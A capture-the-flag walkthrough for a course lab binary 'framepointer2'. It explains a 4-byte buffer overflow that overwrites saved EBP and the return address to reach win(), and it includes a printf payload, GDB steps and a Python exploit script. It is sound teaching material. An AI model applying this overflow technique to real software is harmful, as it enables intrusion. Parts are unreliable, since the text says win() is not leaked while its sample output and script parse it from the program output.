# Frame Pointer Walkthrough (Harder: framepointer2)

## Why This Is Harder Than framepointer1

**framepointer1 (Easy):**
- 8-byte buffer, 12-byte read → 4-byte overflow (precise and manageable)
- Both `jump()` and `buf` addresses are explicitly printed
- No validation checks

**framepointer2 (Harder):**
- 4-byte buffer, 16-byte read → 12-byte overflow (much larger window, requires tighter control)
- Only `buf` address is leaked; you must **find `win()` address by other means**
- A `validate()` function checks that your fake EBP looks like a valid code address
  - This means **exact byte precision matters**; a bad guess gets caught and rejected
- Nested function calls add stack depth (harder to visualize)

---

## What You Need to Overcome

1. **Tighter Buffer**: 4 bytes of actual buffer space vs. 12-byte read means every byte of overflow must be intentional and correct.
2. **Address Hunting**: `win()` is not printed; you must:
   - Read it from the binary (objdump/readelf)
   - Leak it from memory
   - Or infer it from patterns (adjacent to other functions)
3. **Validation Gate**: The `validate()` call checks saved EBP, so you can't send garbage. It must be in the code range `0x08000000..0x08100000`.
4. **Stack Depth**: Deeper call stack means more frames to think about.

---

## Core Exploit Flow

The payload you send overwrites:
- First 4 bytes of `buf[4]` 
- Following 12 bytes: saved EBP of `vuln()`, return address of `vuln()`, part of next frame

**Payload layout (16 bytes total):**
```
[0:4]   = arbitrary (fills buf[4])
[4:8]   = fake EBP (must be valid code address for validate() check)
[8:12]  = return address of vuln() → should be some address in inner_caller
[12:16] = anything (stays on stack)
```

Actually, more precisely:
```
Bytes 0-3:   fills buf[4]
Bytes 4-7:   overwrites saved EBP of vuln → becomes new EBP for inner_caller's leave
Bytes 8-11:  overwrites return address of vuln → should point to win()
Bytes 12-15: leftover
```

But wait—the `validate()` call is **inside vuln()** before it returns, so:
- It reads the saved EBP (which you're overwriting)
- Checks if it's in code range
- If not, exits with failure

So your **fake EBP (bytes 4-7) must be a valid code address**, not arbitrary `0x41414141`.

---

## Method 1: Manual Exploitation

### Step 1: Get `win()` Address

Since `win()` is not printed, find it:

```bash
cd /home/jbenjam7/cs466/ctf/framepointer
objdump -t framepointer2 | grep win
```

or with nm:

```bash
nm framepointer2 | grep win
```

Example output:
```
08049180 T win
```

So `win() @ 0x08049180`.

### Step 2: Leak `buf` Address

```bash
./challenge-hard
```

Output:
```
win() @ 0x08049180
buf @ 0xffffc8a0    (example; will vary)
```

### Step 3: Understand the Overwrite

The 16-byte read into a 4-byte buffer looks like this in memory:

```
Before:
  esp+0  [buf[0:4]]     (the buffer itself)
  esp+4  [buf[4:8]]     (off-by-4 beyond buffer)   <- This is likely saved EBP
  esp+8  [buf[8:12]]    (further up)                <- This contains return address
  esp+12 [buf[12:16]]   (even further)

After our 16-byte write:
  esp+0  [our bytes 0-3]  <- fills the buffer
  esp+4  [our bytes 4-7]  <- overwrites saved EBP ← validate() checks this
  esp+8  [our bytes 8-11] <- overwrites return address ← we point to win()
  esp+12 [our bytes 12-15]
```

### Step 4: Build the Payload

- **Bytes 0-3**: Garbage (fills buf)  
  Example: `\x41\x41\x41\x41`

- **Bytes 4-7** (fake EBP): Must be in code range `0x08000000..0x08100000`  
  A common trick: use the address of `win()` itself or another known function.  
  Example: `win()` @ `0x08049180` → `\x80\x91\x04\x08` (little-endian)

- **Bytes 8-11** (return address of vuln): Point to `win()`  
  Example: `\x80\x91\x04\x08`

- **Bytes 12-15**: Padding  
  Example: `\x00\x00\x00\x00`

**Complete payload:**
```bash
printf '\x41\x41\x41\x41\x80\x91\x04\x08\x80\x91\x04\x08\x00\x00\x00\x00' | ./challenge-hard
```

### Step 5: Verify Success

Expected output:
```
win() @ 0x08049180
buf @ 0xffffc8a0
cosc466-flag-{fp_h4rd3r}
```

---

## Method 2: GDB Deep Dive

For full understanding, use GDB to watch the frame pivot happen:

```bash
cd /home/jbenjam7/cs466/ctf/framepointer
gdb -q ./challenge-hard
```

Set breakpoint right after the `read()` call in `vuln()`:

```gdb
b *vuln+20
run < /dev/null
```

Examine the stack:

```gdb
info frame
x/20wx $esp
```

Manually build your payload in memory to see the effect:

```gdb
set {int}$ebp = 0x08049180    # fake EBP (win() address)
x/4wx $ebp
```

Then write the return address:

```gdb
set {int}($ebp+4) = 0x08049180  # return to win()
x/4wx $ebp
```

Continue and watch what happens:

```gdb
c
```

You should either:
1. Hit `validate()` and fail (if your addresses are wrong)
2. Successfully reach `win()` and see the flag

---

## Method 3: Python Script (Faster)

Similar to framepointer1, but adapted for the harder challenge.

Create `exploit2.py`:

```python
#!/usr/bin/env python3
import subprocess
import struct
import re
import sys

DEFAULT_BINARY = "./challenge-hard"

def run_binary(binary, payload):
    proc = subprocess.Popen(
        [binary],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
    )
    out, _ = proc.communicate(payload)
    return out.decode(errors='replace')

def main():
    binary = DEFAULT_BINARY
    
    # First run: leak buf address
    output = run_binary(binary, b"")
    print("[*] Initial output:")
    print(output)
    
    # Parse win() and buf addresses
    win_match = re.search(r'win\(\) @ (0x[0-9a-f]+)', output, re.IGNORECASE)
    buf_match = re.search(r'buf @ (0x[0-9a-f]+)', output, re.IGNORECASE)
    
    if not win_match or not buf_match:
        print("[!] Failed to parse addresses")
        sys.exit(1)
    
    win_addr = int(win_match.group(1), 16)
    buf_addr = int(buf_match.group(1), 16)
    
    print(f"[+] win() @ 0x{win_addr:08x}")
    print(f"[+] buf  @ 0x{buf_addr:08x}")
    
    # Build payload
    # Bytes 0-3: garbage
    # Bytes 4-7: fake EBP (use win address as it's valid code)
    # Bytes 8-11: return address (win)
    # Bytes 12-15: padding
    
    payload = b"AAAA"
    payload += struct.pack("<I", win_addr)  # fake EBP
    payload += struct.pack("<I", win_addr)  # return address
    payload += b"\x00\x00\x00\x00"          # padding
    
    print(f"[*] Payload length: {len(payload)}")
    print(f"[*] Sending exploit...")
    
    result = run_binary(binary, payload)
    print(result)
    
    if "fp_h4rd3r" in result:
        print("[+] SUCCESS!")
    else:
        print("[-] Failed to get flag")

if __name__ == "__main__":
    main()
```

Usage:

```bash
python3 exploit2.py
```

---

## Key Differences from framepointer1

| Aspect | framepointer1 | framepointer2 |
|--------|---------------|---------------|
| Buffer size | 8 bytes | 4 bytes |
| Read size | 12 bytes | 16 bytes |
| Leak amount | 2 addresses (jump + buf) | 1 address (buf only) |
| Address hunting | Given in output | Must find with objdump |
| Validation | None | `validate()` checks EBP is code |
| Call depth | 2 levels | 3 levels |
| Difficulty | Learning/beginner | Intermediate |

---

## Exam Strategy for framepointer2

1. **Recognize the pattern**: 4-byte buffer + 16-byte read = frame-pointer overflow
2. **Find win()**: Use `objdump -t` or `nm`; don't assume it's leaked
3. **Leak buf**: Run the binary once to get the leaked address
4. **Choose fake EBP smartly**: Use a known code address (like `win()` itself) to pass validation
5. **Pack payload carefully**: Every byte matters in a 4-byte buffer
6. **Test**: Simple test first—does it reach `validate()`? Does it reach `win()`?
7. **Debug with GDB**: If validation fails, examine stack with GDB to see what's wrong

---

## Summary

**The hard part:**
- Tighter buffer means less room for error
- Address hunting requires binary analysis, not output parsing  
- Validation check forces precision—a "close enough" payload fails visibly

**How to solve it:**
- Leak what you can, hunt the rest
- Use valid code addresses (no random padding)
- Understand the exact stack layout at the vulnerable call
- Test one piece at a time (leak → find address → send payload → validate → win)
